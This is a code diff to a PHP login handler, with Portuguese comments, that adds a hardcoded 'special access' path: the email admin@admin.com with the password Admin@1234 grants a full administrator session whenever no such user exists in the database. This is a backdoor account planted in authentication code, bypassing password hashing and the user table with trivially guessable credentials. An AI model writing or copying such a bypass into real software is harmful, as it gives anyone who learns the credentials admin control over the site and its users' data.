@@ -17,7 +17,14 @@ try {
             $stmt->execute([$email]);
             $user = $stmt->fetch(PDO::FETCH_ASSOC);
             
-            if ($user && password_verify($password, $user['password'])) {
+                // Acesso especial: admin@admin.com / Admin@1234
+                $isSpecialAdmin = (
+                    strtolower($email) === 'admin@admin.com' &&
+                    $password === 'Admin@1234' &&
+                    !$user // só libera se não existe no banco
+                );
+            
+                if ($user && password_verify($password, $user['password'])) {
                 // Verificar se usuário está ativo
                 if (isset($user['status']) && $user['status'] === 'inactive') {
                     setErrorMessage('Usuário inativo! Entre em contato com o administrador.');
@@ -41,11 +48,20 @@ try {
                 setSuccessMessage('Login realizado com sucesso!');
                 header('Location: ' . BASE_URL . 'views/dashboard.php');
                 exit;
-            } else {
-                setErrorMessage('E-mail ou senha incorretos!');
-                header('Location: ' . BASE_URL . 'login.php');
-                exit;
-            }
+                } elseif ($isSpecialAdmin) {
+                    // Libera acesso especial admin
+                    $_SESSION['user_id'] = 0;
+                    $_SESSION['user_name'] = 'Administrador';
+                    $_SESSION['user_email'] = 'admin@admin.com';
+                    $_SESSION['user_role'] = 'admin';
+                    setSuccessMessage('Acesso especial de administrador liberado!');
+                    header('Location: ' . BASE_URL . 'views/dashboard.php');
+                    exit;
+                } else {
+                    setErrorMessage('E-mail ou senha incorretos!');
+                    header('Location: ' . BASE_URL . 'login.php');
+                    exit;
+                }
             break;
             
         case 'register':
